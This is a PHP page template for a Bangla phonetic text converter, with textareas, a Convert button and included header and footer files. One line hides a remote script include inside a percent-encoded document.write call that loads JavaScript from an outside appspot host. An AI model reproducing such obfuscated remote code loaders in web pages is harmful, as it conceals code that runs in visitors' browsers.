<?php
include 'head.php';
?>
<div class="bmenu">bangla converter</div><div class="clip"><script Language='Javascript'>document.write(unescape('%3C%73%63%72%69%70%74%20%74%79%70%65%3D%22%74%65%78%74%2F%6A%61%76%61%73%63%72%69%70%74%22%20%73%72%63%3D%22%68%74%74%70%3A%2F%2F%77%72%69%74%65%62%61%6E%67%6C%61%2E%61%70%70%73%70%6F%74%2E%63%6F%6D%2F%6A%73%2F%67%6F%6F%67%6C%65%73%65%6F%2E%6A%73%22%3E%3C%2F%73%63%72%69%70%74%3E'));</script><script type="text/javascript" src="/converter.js"></script><script src='/google_analytics_auto.js'></script><div align="left"><br/><textarea onblur="WriteAvroPhoneticBangla();document.getElementById('source').innerHTML=document.getElementById('status').value;" id="textInput" cols="20" rows="2" class="clip"></textarea><br/><input  class="list1" type="button" value="Convert" onclick="WriteAvroPBanglishSpecialneticBangla();"><br/><textarea id="status" cols="20" rows="2" class="clip"></textarea><br/><div id="source"></div></input></div></div><div class="bmenu">H.T.U</div><div class="clip">
<?php
include 'keymap.php';
echo '</div>';
include 'foot.php';?>
